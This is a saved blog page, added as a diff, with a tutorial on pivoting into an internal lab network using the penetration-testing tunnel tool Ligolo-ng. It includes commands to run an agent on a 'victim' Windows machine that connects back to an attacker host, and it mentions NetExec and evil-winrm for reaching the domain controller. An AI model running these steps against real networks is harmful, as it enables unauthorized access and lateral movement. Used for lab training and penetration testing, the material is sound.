@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<!-- saved from url=(0081)https://0xc4t.github.io/content.html?p=md/simplifying-pivoting-using-ligolo-ng.md -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simplifying Pivoting Using Ligolo-ng</title>
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Simplifying Pivoting Using Ligolo-ng">
+    <meta property="og:description" content="Ligolo-ng is an open-source tool created by Nicolas Chatelain, written in the Go programming language (Golang). This tool allows penetration testers to perform tunneling similar to a VPN.">
+    <meta property="og:site_name" content="0xc4t Posts">
+    <meta property="og:image" content="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*j3wIFsUjSpTMMPjD64l_cQ.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="icon" type="image/x-icon" href="https://pbs.twimg.com/profile_images/1960719102932344837/T8Sl7V0i_400x400.jpg">
+  </head>
+  <body>
+    <h1>0xc4t Notes</h1>
+    <p class="slogan">
+      <i>Web Security &amp; Active Directory Security</i>
+    </p>
+    <nav>
+      <a href="https://0xc4t.github.io/index.html">Posts</a>
+    </nav>
+    <hr>
+    <div id="content" class="content"><h2>Simplifying Pivoting Using Ligolo-ng</h2>
+<p>A while ago, I became quite interested in learning about pivoting, and I started exploring various tools that can be used for pivoting, such as Chisel, SSHuttle, Metasploit, and SSH tunneling. Among the many tools I found on the internet, I was particularly intrigued by a tool called Ligolo-ng. This tool allows us to perform pivoting in a manner similar to a VPN, utilizing the tun0 interface. So, when we pivot using this tool, we essentially gain a dedicated interface provided by the tool itself.</p>
+<h3>What is Ligolo-ng?</h3>
+<p>Ligolo-ng is an open-source tool created by Nicolas Chatelain, written in the Go programming language (Golang). This tool allows penetration testers to perform tunneling similar to a VPN. It can be utilized for pivoting during penetration testing. For the setup process, you can follow the steps below. I will demonstrate the setup using Kali Linux.</p>
+<p><img src="1_j3wIFsUjSpTMMPjD64l_cQ.webp" alt="Image 1"></p>
+<p>Here, you can see the infrastructure I have set up. There are two different networks: the External network (192.168.56.0/24) and the Internal network (10.10.10.0/24). Within the Internal network, there are two Windows Servers, one of which is a DC (Domain Controller) and the other is a Windows Server for developers. DEV01 (the developer machine) is joined to the domain of DC01 (domain: wtbank.local). Our goal is to figure out how the attacker can access the Internal network to log in to the DC01 machine. Let’s proceed with the setup.</p>
+<h3>Setup Ligolo-ng</h3>
+<pre><code>$ sudo ip tuntap add user [your_username] mode tun ligolo
+# sudo ip link set ligolo up
+</code></pre>
+<p>You can configure the internal network you wish to access. For instance, in this scenario, it is 10.10.10.0/24. Add a route to access the 10.10.10.0/24 network using the ip route command.</p>
+<pre><code>$ sudo ip route add 10.10.10.0/24 dev ligolo
+</code></pre>
+<p><img src="1_LJ6VFIzIxjqqKW66qHuqjQ.webp" alt="Image 2"></p>
+<p><img src="1_PfR1pMDAShq4K-Wws6KW-Q.webp" alt="Image 3"></p>
+<p>Run the proxy server on your Kali Linux, and ensure that you set the executable permission on the proxy binary.</p>
+<pre><code>$ chmod +x proxy
+$ ./proxy -selfcert
+</code></pre>
+<p>Upload the agent.exe file to the Windows victim machine and execute it.</p>
+<pre><code>$ .\agent.exe -connect &lt;attacker-ip&gt;:&lt;port&gt; -ignore-cert
+</code></pre>
+<p><img src="1_SbNGHXfAMURdlYmYB22AcA.webp" alt="Image 4"></p>
+<h3>Running tunneling</h3>
+<pre><code>session &lt;enter&gt;
+start &lt;enter&gt;
+</code></pre>
+<p>Now we can access the internal networks 10.10.10.0/24 and let’s try to run NetExec for host discovery and connect winrm using evil-winrm.</p>
+<p><img src="1_iDfDQNUFhtHrtHciftK2pA.webp" alt="Image 5"></p>
+<p><img src="1_DdJO6tBDSr2ylWgvELgZEg.webp" alt="Image 6"></p>
+<p>It’s that easy to pivot, because with ligolo-ng it really helps us to pivot, maybe next time I will make a video version and thank you for reading until the end ~ bye</p>
+</div>
+
+    <div class="social-icons">
+      <a href="https://www.instagram.com/0xc4t?utm_source=ig_web_button_share_sheet&amp;igsh=ZDNlZDc0MzIxNw==" target="_blank"><i class="fab fa-instagram"></i></a>
+      <a href="https://x.com/iamvarel" target="_blank"><i class="fab fa-x-twitter"></i></a>
+    </div>
+    <div class="footer">
+      © 2025 0xc4t
+    </div>
+
+
+</body></html>
